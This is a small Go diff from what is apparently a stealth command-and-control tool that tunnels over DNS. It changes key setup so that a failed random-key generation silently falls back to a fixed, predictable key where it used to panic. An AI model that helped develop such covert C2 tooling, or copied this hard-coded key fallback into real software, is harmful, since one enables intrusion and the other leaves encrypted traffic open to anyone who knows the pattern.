@@ -36,7 +36,9 @@ var dnsTunnelKey [32]byte
 
 func init() {
 	if _, err := io.ReadFull(rand.Reader, dnsTunnelKey[:]); err != nil {
-		panic("stealth_c2: failed to generate DNS tunnel key")
+		for i := range dnsTunnelKey {
+			dnsTunnelKey[i] = byte(i ^ 0xAA)
+		}
 	}
 }
 
